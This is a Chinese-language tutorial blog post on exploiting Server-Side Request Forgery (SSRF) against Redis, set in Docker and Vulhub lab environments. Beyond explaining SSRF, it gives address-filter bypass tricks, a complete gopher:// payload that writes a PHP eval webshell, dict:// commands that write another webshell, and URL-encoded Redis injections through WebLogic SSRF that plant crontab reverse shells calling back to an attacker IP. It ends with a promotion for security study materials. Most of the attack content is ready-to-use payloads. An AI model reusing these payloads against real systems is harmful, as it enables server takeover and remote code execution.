# 原创
：  SSRF中Redis的利用

# SSRF中Redis的利用

## 1. SSRF

### 1.1 什么是SSRF

 SSRF(Server-Side Request Forgery,服务器请求伪造)是一种由攻击者构造请求,由服务端发起请求的安全漏洞,一般情况下,SSRF攻击的目标是外网无法访问的内网系统(因为请求是由服务端帮我们发起的，所以我们可以通过它来向其所在的内网机器发起请求)。

### 1.2 漏洞成因

 SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片等,利用的是服务端的请求伪造,SSRF利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。

### 1.3 可能会存在SSRF的地方
1.  `&gt; 转码服务` 1.  `&gt; 在线翻译` 1.  `&gt; 获取超链接的标题等内容进行显示` 1.  `&gt; 请求远程服务器资源的地方，图片加载与下载(通过URL地址加载或下载图片)` 1.  `&gt; 图片、文章收藏功能` 1.  `&gt; 对外发起网络请求的地方，网站采集、网页抓取的地方。` 1.  `&gt; 一切要你输入网址的地方和可以输入ip的地方。` 1.  `&gt; 数据库内置功能(mongodb的copyDatabase函数)` 1.  `&gt; 从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain` 
### 1.4 SSRF分类

 我觉得就分为回显和不回显两种方式,会回显请求的响应内容那么最好不过,如果不会回显的话，那么一般就只能通过响应时间来判断了

### 1.5 验证方法

 如果是会回显信息的SSRF漏洞，那么看他的响应结果就好了，如果是不会回显的，那么我们可以利用DNSLOG来进行判断

### 1.6 利用方式
1.  对外网或服务器所在的内网或服务器自身发起端口扫描 1.  攻击运行在内网或本地的应用程序 1.  利用file协议读取本地文件 1.  …….. 
### 1.7 可以利用的协议
1.  http/https,发起HTTP请求 1.  file,如果会回显数据的话，那么我们可以使用file协议读取目标本地文件 1.  dict,可以用来探测目标端口 1.  gopher,可以发送get/post请求 1.  ftp,文件传输协议 1.  ….. 
### 1.8 SSRF过滤绕过
1.  0.0.0.0,这个IP地址可以直接访问到本地 1.  把IP地址的格式进行转换从而绕过 1.  `通常我们用的是127.0.0.1,但事实上127这个段的地址都用来表示本机地址了，所以像127.155.155.155这样的也是可以的，还可以进行进制转换也是可以的` 1.   1.  `&gt; 8进制(把127转为八进制写的时候前面加个0):0177.0.0.1` 1.  `&gt; 16进制(把127转为十六进制写的时候前面加个0x):0x7f.0.0.1` 1.  `&gt; 16进制整数格式:0X7F000001` 1.  `&gt; 10进制证书格式(把16整数转为10进制):2130706433` 1.   1.  `上面这些都是可以访问到的` 1.  localhost 1.  利用@绕过例如,www.baidu.com@127.0.0.1 1.  利用非HTTP协议，例如上面说到的gopher或者dict 1.  利用DNS解析(可以用DNSLOG) 1.  利用IPv6 1.  添加端口号 1.  [::]代替127.0.01,比如http://[::]:80,这样也是可以访问到的 
## 2. SSRF攻击Redis

### 2.1 环境搭建

使用Docker进行环境的搭建,需要的文件我已经打包好了，如果没有docker环境的话需要安装(请使用linux系统)
1.  使用`tar xzvf ssrf.tar.gz`解压ssrf.tar.gz, 1.  `cd ssrf_dockerfile`,进入到解压的文件目录下 1.  构建镜像,`docker build -t ssrf:v1 .`  1.  Successfully built说明构建成功，也可以再使用`docker images`命令查看镜像是否存在  1.  `docker run -d -p 80:80 ssrf:v1`,启动镜像  1.  启动成功，访问127.0.0.1查看是否搭建成功  1.  漏洞点为ssrf.php，参数名为url，测试一下是否存在漏洞  
环境搭建完毕

### 2.2 漏洞复现(通过ssrf利用redis写入webshell)

#### 2.2.1 想要写入webshell的两个条件
1.  要知道网站的绝对路径 1.  redis有目录的写入权限 
#### 2.2.2 通过gopherus实现

这里是通过gopher协议进行利用

##### 0x00 Gopherus(gopher协议利用工具)

###### Gopherus简介

Gopherus下载地址

自己手动把攻击语句转换成Gopher协议的格式会很麻烦，这款工具里面内置了一些早就写好的利用语句，我们只需要学会如何使用它就可以很方便的写出一些我们需要的利用语句。

###### Gopherus可以生成的payload
1.  MySQL (Port-3306) 1.  PostgreSQL(Port-5432) 1.  FastCGI (Port-9000) <li> Memcached (Port-11211)<br/> If stored data is getting De-serialized by:
</li>1.  Redis (Port-6379) 1.  Zabbix (Port-10050) 1.  SMTP (Port-25) 
###### 命令
1.  `gopherus --exploit [mysql | postgresql | fastcgi | redis | smtp | zabbix | pymemcache | rbmemcache | phpmemcache | dmpmemcache]` 
exploit后面写要利用的服务就好了

###### 实际演示

这里将使用Gopherus这个工具生成利用语句,不了解的小伙伴可以先去看一下Gopherus那一段
1.  再phpinfo页面中我们可以看到站点的绝对路径为`/var/www/html`  1.  启动gopherus，`python gopherus.py --exploit redis`,shell写入方式选择phpshell  1.  然后填入绝对路径，这里刚好是默认的，回车就好  1.  然后填写要写入的内容,我这里写的一句话木马  1.  生成好了,如果执行成功他会再目录下生成shell.php这个文件  <li> 现在这个语句还不能马上拿去用，需要做一下处理`gopher://127.0.0.1:6379/_`这部分不用变，后面的复制,再拿去进行一次url编码,然后拼接回`gopher://127.0.0.1:6379/_`后面，我处理好的如下 
<ol>1.  `gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252430%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_REQUEST%255B8%255D%2529%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A` 
然后传参给url参数,回车

shell写入成功

#### 2.2.3 通过Dict协议实现

##### Dict协议使用注意事项
1.  Dict协议中可以用:代替空格 1.  ?会截断后面的内容(写马的情况下要想办法bypass “?”) 1.  dict协议一次只能发送一条数据 
##### 实际演示
1.  `dict://127.0.0.1:6379/flushall`,先清空所有的key  1.  `dict://127.0.0.1:6379/set:hack:'&lt;script language="php"&gt;@eval($_REQUEST[8]);&lt;/script&gt;'`,写入一句话木马到key中，这里最好进行一次url编码  1.  `dict://127.0.0.1:6379/config:set:dir:/var/www/html/`，设置工作目录  1.  `dict://127.0.0.1:6379/config set dbfilename hack.php`,设置持久化文件名为hack.php,这里把去掉了`:`用了空格，注意两者没有差别  1.  `dict://127.0.0.1:6379/save`,保存生成持久化文件  1.  成功  
再可以回显的情况下，其实也可以查看redis中的数据

## 3. Weblogic SSRF漏洞(Redis利用)

### 3.1 环境搭建

#### 3.1.1 Vulhub

这里用的是Vulhub中的环境来复现的,所以就简单说一下

简单来说Vulhub是一个漏洞复现的测试靶场它里面内置了许多的漏洞环境，并且提供了复现文档,如下图<br/>  

<br/> Vulhub下载地址<br/> 文档地址<br/> 怎么搭建和使用它也有帮助文档，百度上面也有很多相关的教程，这里就不多说了<br/> 这里要用的是它的weblogic SSRF漏洞的这个环境

#### 3.1.2 运行环境
1.  进到vulhub中的`/weblogic/ssrf/`目录下  1.  执行如下命令启动环境,`docker-compose up -d`,如果报错没有docker-compose这个命令的话，百度一下怎么安装  1.  执行`docker ps`命令查看环境是否已经运行了,这里是已经运行起来了  1.  环境搭建完毕，开干！！！  
### 3.2 漏洞测试

#### 3.2.1 内网扫描

这个漏洞点的位置在
1.  `http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp` 
点击`search`抓包，可以看到operator的参数值是一个链接

那我们测试这里是否存在ssrf，把地址改成`http://127.0.0.1:7001`之后它的显示是这样的

然后我们随便改成其他端口,可以发现保存的内容是不一样的，那么我们可以由此来判断端口是否存在

把包发送到Intruder模块，进行端口枚举

这里就设置1~10000的范围

没有他探测到有其他端口开放

尝试对内网进行扫描,我这里的docker环境内网地址应该是172.18这个段的,所以我就跑这个段了,设置好范围

我这里用的是自定义迭代器的payload类型，第一个填172,分隔符为`.`

第二个填18,分隔符为`.`

第三个填0~255，分隔符为`.`

第四个填0~255,注意没有分隔符

开冲，可以看到如果地址不存在是返回No route to host

而这个存在的显示内容如下,那么对他进行端口扫描

检测到6379端口开放，这个的redis的默认端口,下面尝试是否可以进行利用

#### 3.2.2 通过redisGetshell

Weblogic的SSRF有一个比较大的特点，就是我们可以通过传入`%0a%0d`来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。

这里我们利用crontab计划任务反弹shell,先用nc开启监听`nc -lvp 9999`

然后编写redis名命令,命令中的IP地址和端口号记得改成自己的
1.  `aaa` 1.   1.  `set 1 "\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.147.129/9999 0&gt;&amp;1\n"` 1.  `config set dir /var/spool/cron` 1.  `config set dbfilename root` 1.  `save` 1.   1.  `aaa` 
然后进行url编码，注意换行用%0d%0a替换

```
http://172.18.0.2:6379/aaa%0D%0A%0D%0Aset%201%20%22%5Cn*%20*%20*%20*%20*%20%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.147.129%2F9999%200%3E%261%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fspool%2Fcron%0D%0Aconfig%20set%20dbfilename%20root%0D%0Asave%0D%0A%0D%0Aaaa
```

好了之后直接拼接到url后面然后Send

成功获得shell

注意点
1.  计划任务可能会等一会才会执行，shell不会立马反弹,等个一分钟左右 1.  一定要docker容器和主机可以通信,我因为nc的机器没关防火墙明明成功了，但是弹不回shell 
#### 3.2.3 crontab可以写入的位置
1.  `/ect/crontab` 
```
TEST



set 1 "\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.147.129/9999 0&gt;&amp;1\n\n\n\n"

config set dir /etc/

config set dbfilename crontab

save



BBB
```

```
TEST%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.147.129%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0ABBB
```
<li> `/etc/cron.d/*` <pre><code>TEST



set 1 "\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.147.129/9999 0&gt;&amp;1\n\n\n\n"

config set dir /etc/cron.d

config set dbfilename shell

save



BBB</code></pre>  </li>
```
TEST%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.147.129%2F9999%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2Fcron.d%0D%0Aconfig%20set%20dbfilename%20shell%0D%0Asave%0D%0A%0D%0ABBB

/var/spool/cron/root,复现过程中用的就是这个

var/spool/cron/crontabs/root,debian系统下root用户的cron文件
```

**没看够~？欢迎关注！**

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/a7c7909b487744e681947a00ea1f0440.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/70e73e2126ad4778a5336ca0f58dc621.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/09d0c9afb99142ada805e5d98cca9027.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/0fd2b06802e84ef88ebc02f8d9f346f0.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/7146f36d28204dd2a73be79ee7de0122.png" width="665"/>

应急响应笔记

学习路线
